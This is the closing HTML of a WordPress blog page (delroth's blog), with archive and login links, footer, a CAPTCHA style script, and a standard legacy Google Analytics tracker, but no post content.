	<li><a href='http://blog.delroth.net/2012/03/'>March 2012</a></li>
	<li><a href='http://blog.delroth.net/2011/11/'>November 2011</a></li>
	<li><a href='http://blog.delroth.net/2011/10/'>October 2011</a></li>
	<li><a href='http://blog.delroth.net/2011/06/'>June 2011</a></li>
	<li><a href='http://blog.delroth.net/2011/04/'>April 2011</a></li>
	<li><a href='http://blog.delroth.net/2011/03/'>March 2011</a></li>
	<li><a href='http://blog.delroth.net/2011/01/'>January 2011</a></li>
	<li><a href='http://blog.delroth.net/2010/12/'>December 2010</a></li>
	<li><a href='http://blog.delroth.net/2010/10/'>October 2010</a></li>
		</ul>
</li>
<li id="meta-3" class="widget widget_meta"><h2 class="widgettitle">Meta</h2>
			<ul>
						<li><a href="http://blog.delroth.net/wp-login.php">Log in</a></li>
			<li><a href="http://blog.delroth.net/feed/" title="Syndicate this site using RSS 2.0">Entries <abbr title="Really Simple Syndication">RSS</abbr></a></li>
			<li><a href="http://blog.delroth.net/comments/feed/" title="The latest comments to all posts in RSS">Comments <abbr title="Really Simple Syndication">RSS</abbr></a></li>
<li><a href="https://wordpress.org/" title="Powered by WordPress, state-of-the-art semantic personal publishing platform.">WordPress.org</a></li>			</ul>
</li>
	</ul><!-- end ul -->
</div><!-- end sidebar --><div class="clear"></div>
</div><!-- end container -->
</div><!-- end page_wrap -->
<div id="footer">
	<div class="footer_wrapper">
		<div class="footer_left">
			&copy;&nbsp;delroth&#039;s blog.&nbsp;Powered by <a href="http://wordpress.org/" title="CODE IS POETRY">WordPress</a>&nbsp;and&nbsp;<a href="http://imotta.cn/" title="Pyrmont V2 theme">Pyrmont V2</a>.		</div>
	</div>
</div><!-- end footer -->

<script type='text/javascript' src='http://blog.delroth.net/wp-content/plugins/si-captcha-for-wordpress/captcha/si_captcha.js?ver=1.0'></script>
<script type="text/javascript">
//<![CDATA[
var si_captcha_styles = "\
<!-- begin SI CAPTCHA Anti-Spam - comment form style -->\
<style type='text/css'>\
div#captchaImgDiv { display:block; }\
.captchaSizeDivSmall { width:175px; height:45px; padding-top:10px; }\
.captchaSizeDivLarge { width:250px; height:60px; padding-top:10px; }\
img#si_image_com,#si_image_reg,#si_image_log,#si_image_side_login { border-style:none; margin:0; padding-right:5px; float:left; }\
.captchaImgRefresh { border-style:none; margin:0; vertical-align:bottom; }\
div#captchaInputDiv { display:block; padding-top:15px; padding-bottom:5px; }\
label#captcha_code_label { margin:0; }\
input#captcha_code { width:65px; }\
</style>\
<!-- end SI CAPTCHA Anti-Spam - comment form style -->\
";
jQuery(document).ready(function($) {
$('head').append(si_captcha_styles);
});
//]]>
</script>

<!-- tracker added by Ultimate Google Analytics plugin v1.6.0: http://www.oratransplant.nl/uga -->
<script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
</script>
<script type="text/javascript">
var pageTracker = _gat._getTracker("UA-5596350-8");
pageTracker._initData();
pageTracker._trackPageview();
</script>
<script type='text/javascript' src='http://blog.delroth.net/wp-includes/js/comment-reply.min.js?ver=3.9'></script>

</body>
</html>
<!-- Dynamic page generated in 0.296 seconds. -->
<!-- Cached page generated by WP-Super-Cache on 2014-06-30 12:29:45 -->

<!-- Compression = gzip -->